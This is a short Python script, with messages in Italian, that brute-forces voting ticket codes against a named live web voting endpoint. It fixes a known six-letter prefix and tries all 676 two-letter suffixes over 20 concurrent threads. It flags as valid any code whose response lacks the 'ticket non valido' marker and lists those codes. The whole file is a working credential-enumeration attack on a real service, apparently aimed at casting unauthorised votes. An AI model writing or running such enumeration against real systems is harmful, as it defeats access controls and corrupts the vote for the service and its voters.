#!/usr/bin/env python3
import string
import requests
import itertools
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE_URL = "https://play-the-future-vfu.up.railway.app/vote"
CHARSET = string.ascii_uppercase  # A-Z only
INVALID_MARKER = "ticket non valido"
WORKERS = 20

# --- Config ---
KNOWN_PREFIX = "RXKPIY"          # fixed part we know is valid
SUFFIX_LEN = 8 - len(KNOWN_PREFIX)  # brute-force remaining chars (2 → 676 combos)


def check_code(code):
    url = f"{BASE_URL}/{code}"
    try:
        r = requests.get(url, timeout=10)
        if INVALID_MARKER not in r.text.lower():
            return url, r.status_code, r.text[:300]
    except requests.RequestException as e:
        print(f"\n[ERR] {code}: {e}")
    return None


def generate_candidates():
    for suffix in itertools.product(CHARSET, repeat=SUFFIX_LEN):
        yield KNOWN_PREFIX + "".join(suffix)


def main():
    candidates = list(generate_candidates())
    total = len(candidates)
    valid = []

    print(f"Prefix fisso : {KNOWN_PREFIX}")
    print(f"Suffix libero: {SUFFIX_LEN} char  →  {total} combinazioni totali")
    print(f"Endpoint     : {BASE_URL}/<code>\n")

    with ThreadPoolExecutor(max_workers=WORKERS) as pool:
        futures = {pool.submit(check_code, code): code for code in candidates}
        done = 0
        for future in as_completed(futures):
            done += 1
            code = futures[future]
            result = future.result()
            print(f"[{done:4}/{total}] {code}", end="\r")
            if result:
                url, status, preview = result
                valid.append(url)
                print(f"\n  *** VALIDO ***  {url}  (HTTP {status})")
                print(f"  Preview: {preview!r}\n")

    print(f"\n\nCompletato: {len(valid)} ticket validi su {total} testati")
    if valid:
        print("\n--- Ticket validi ---")
        for u in valid:
            print(f"  {u}")

    return valid


if __name__ == "__main__":
    main()
